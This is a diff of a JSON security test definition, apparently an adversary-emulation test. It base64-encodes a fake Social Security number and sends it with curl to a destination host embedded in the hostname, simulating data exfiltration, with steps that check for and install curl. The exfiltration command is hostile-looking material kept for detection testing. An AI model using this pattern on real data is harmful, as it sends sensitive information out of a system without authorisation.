@@ -7,68 +7,68 @@
   ],
   "steps": [
     {
-      "id": "c30b87af-c847-49c9-bda2-d56502618b9f",
+      "id": "d144eef5-c817-4cea-9cf1-33f129402206",
       "type": "execute-command",
       "data": {
-        "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
+        "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "a3149daf-15cb-40e7-ad1d-ebf9e8cfdf8f",
+      "id": "f0236b6f-af72-4246-a243-09c6bc9a0261",
       "name": "Check dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
-        "command_type": ""
+        "command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "3b85d495-63c2-4a51-b8b3-f519ddff321d",
+      "id": "b613a7c7-01d3-48cb-bd76-105c29fffb82",
       "name": "Resolve dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
       "data": {
-        "command": "pkg install -y curl\n",
-        "command_type": ""
+        "command": "pkg install -y curl",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "c8574e8b-f835-4538-8063-5f17fac0f55f",
+      "id": "6fc6a75d-b408-44d3-b979-3a34204c044b",
       "name": "Re-check dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
-        "command_type": ""
+        "command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;",
+        "command_type": "sh"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "a3149daf-15cb-40e7-ad1d-ebf9e8cfdf8f",
+      "s": "f0236b6f-af72-4246-a243-09c6bc9a0261",
       "p": "on-success",
-      "o": "c30b87af-c847-49c9-bda2-d56502618b9f"
+      "o": "d144eef5-c817-4cea-9cf1-33f129402206"
     },
     {
-      "s": "a3149daf-15cb-40e7-ad1d-ebf9e8cfdf8f",
+      "s": "f0236b6f-af72-4246-a243-09c6bc9a0261",
       "p": "on-failure",
-      "o": "3b85d495-63c2-4a51-b8b3-f519ddff321d"
+      "o": "b613a7c7-01d3-48cb-bd76-105c29fffb82"
     },
     {
-      "s": "3b85d495-63c2-4a51-b8b3-f519ddff321d",
+      "s": "b613a7c7-01d3-48cb-bd76-105c29fffb82",
       "p": "on-success",
-      "o": "c8574e8b-f835-4538-8063-5f17fac0f55f"
+      "o": "6fc6a75d-b408-44d3-b979-3a34204c044b"
     },
     {
-      "s": "c8574e8b-f835-4538-8063-5f17fac0f55f",
+      "s": "6fc6a75d-b408-44d3-b979-3a34204c044b",
       "p": "on-failure",
-      "o": "c30b87af-c847-49c9-bda2-d56502618b9f"
+      "o": "d144eef5-c817-4cea-9cf1-33f129402206"
     }
   ],
   "tags": [
@@ -77,16 +77,16 @@
   ],
   "input_arguments": [
     {
-      "name": "base64_data",
-      "type": "string",
-      "description": "Encoded data to post using fake Social Security number 111-11-1111.",
-      "value": "MTExLTExLTExMTE="
-    },
-    {
       "name": "destination_url",
       "type": "url",
       "description": "Destination URL to post encoded data.",
       "value": "redcanary.com"
+    },
+    {
+      "name": "base64_data",
+      "type": "string",
+      "description": "Encoded data to post using fake Social Security number 111-11-1111.",
+      "value": "MTExLTExLTExMTE="
     }
   ]
 }
